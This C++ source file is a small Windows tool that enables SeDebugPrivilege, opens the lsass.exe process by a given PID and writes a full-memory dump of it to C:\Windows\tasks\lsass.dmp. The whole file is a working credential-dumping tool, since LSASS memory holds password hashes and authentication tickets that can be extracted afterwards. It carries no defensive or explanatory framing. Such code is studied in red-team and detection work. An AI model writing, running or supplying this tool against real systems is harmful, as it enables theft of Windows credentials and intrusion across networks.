#include <Windows.h>
#include <minidumpapiset.h>
#include <DbgHelp.h>
#include <stdio.h>

#pragma comment(lib, "DbgHelp.lib")

int main(int argc, char* argv[]) {

	if (argc < 2) {
		printf("Usage: MiniDump.exe <PID>\n");
		return EXIT_FAILURE;
	}
	
	LPCWSTR filePath = L"C:\\Windows\\tasks\\lsass.dmp";
	HANDLE hProcess, hFile;
	DWORD LsassProcessID = atoi(argv[1]);
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	bool dumped;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	printf("[+] SeDebugPrivilege Enabled\n");


	printf("[+] Got lsass.exe PID: %lu\n", LsassProcessID);

	hProcess = ::OpenProcess(
		 /* _In_ DWORD dwDesiredAccess */PROCESS_ALL_ACCESS
		,/* _In_ BOOL  bInheritHandle  */false
		,/* _In_ DWORD dwProcessId     */LsassProcessID
	);

	if (hProcess == nullptr) {
		printf("[-] Open Process Error: 0x%lx\n", ::GetLastError());
		return EXIT_FAILURE;
	}

	printf("[+] Got a handle on lsass.exe: 0x%p\n", hProcess);

	hFile = ::CreateFile(
		 /* _In_     LPCWSTR               lpFileName            */filePath				
		,/* _In_     DWORD                 dwDesiredAccess       */GENERIC_WRITE		
		,/* _In_     DWORD                 dwShareMode           */0					
		,/* _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes  */nullptr				
		,/* _In_     DWORD                 dwCreationDisposition */CREATE_ALWAYS		
		,/* _In_     DWORD                 dwFlagsAndAttributes  */FILE_ATTRIBUTE_NORMAL
		,/* _In_opt_ HANDLE                hTemplateFile         */nullptr              
	);


	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to create file: 0x%lx\n", ::GetLastError());
		return EXIT_FAILURE;
	}


	dumped = MiniDumpWriteDump(
		 /* _In_     HANDLE                            hProcess        */hProcess
		,/* _In_     DWORD                             ProcessId       */LsassProcessID
		,/* _In_     HANDLE                            hFile           */hFile
		,/* _In_     MINIDUMP_TYPE                     DumpType        */MiniDumpWithFullMemory
		,/* _In_opt_ PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam  */nullptr
		,/* _In_opt_ PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam */nullptr
		,/* _In_opt_ PMINIDUMP_CALLBACK_INFORMATION    CallbackParam   */nullptr
	);

	if (dumped) {
		printf("[+] Dumped LSASS memory to %ls\n", filePath);
	}
	else {
		printf("[-] Error dumping LSASS memory 0x%lx\n", ::GetLastError());
	}

	CloseHandle(hToken);
	CloseHandle(hProcess);
	CloseHandle(hFile);

	return EXIT_SUCCESS;
}